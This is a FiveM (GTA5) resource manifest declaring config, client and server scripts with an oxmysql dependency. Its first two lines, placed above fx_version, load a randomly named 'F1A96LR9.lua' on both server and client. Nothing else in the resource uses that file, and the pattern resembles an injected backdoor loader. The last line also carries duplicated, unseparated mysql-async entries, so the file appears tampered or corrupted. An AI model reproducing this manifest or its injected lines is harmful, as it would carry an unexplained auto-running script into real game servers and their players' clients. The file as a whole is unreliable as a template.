server_script "F1A96LR9.lua"
client_script "F1A96LR9.lua"
fx_version 'cerulean'
game 'gta5'

shared_script 'config.lua'

client_scripts {
    'client/cl_main.lua'
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server/sv_main.lua'
}

lua54 'yes'server_scripts { '@mysql-async/lib/MySQL.lua' }server_scripts { '@mysql-async/lib/MySQL.lua' }